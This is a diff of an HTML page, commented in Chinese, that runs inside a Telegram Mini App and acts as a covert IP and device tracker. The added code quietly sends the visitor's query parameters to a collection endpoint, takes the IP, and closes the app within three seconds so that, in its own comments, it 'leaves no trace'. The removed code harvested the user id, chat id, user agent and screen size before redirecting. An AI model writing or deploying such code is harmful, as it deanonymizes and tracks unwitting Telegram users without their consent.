@@ -1,23 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
+<head>
+    <meta charset="UTF-8">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #000; margin: 0; padding: 0; } /* 全黑背景 */
+    </style>
+</head>
 <body>
     <script>
-        // 1. 瞬间抓取参数
-        const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('id') || 'unknown';
-        const chatId = urlParams.get('chat') || '';
+        // 1. 初始化并隐藏界面
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
 
-        // 2. 这里的 fetch 是关键，它在后台静默发送
-        // 使用 navigator.sendBeacon 或者 fetch 的 keepalive 确保页面关闭时数据也能发出去
-        const dataUrl = `/api/collect?id=${userId}&chat=${chatId}&ua=${encodeURIComponent(navigator.userAgent)}&screen=${window.screen.width}x${window.screen.height}`;
-        
-        // 这种方式发请求最快，不等待响应
-        fetch(dataUrl, { mode: 'no-cors', keepalive: true });
+        // 2. 静默上报并请求解禁
+        fetch('/api/collect' + window.location.search)
+            .then(response => response.json())
+            .then(data => {
+                // 不管成功失败，拿完 IP 立刻关窗，不留痕迹
+                tg.close();
+            })
+            .catch(err => {
+                // 报错也秒关，不弹窗
+                tg.close();
+            });
 
-        // 3. 毫秒级跳转
-        // 让他感觉只是手机晃了一下
-        window.location.href = "tg://resolve?domain=baidashayanjiusuo";
+        // 3. 保险起见，3秒后如果还没关，强行自杀
+        setTimeout(() => { tg.close(); }, 3000);
     </script>
 </body>
 </html>
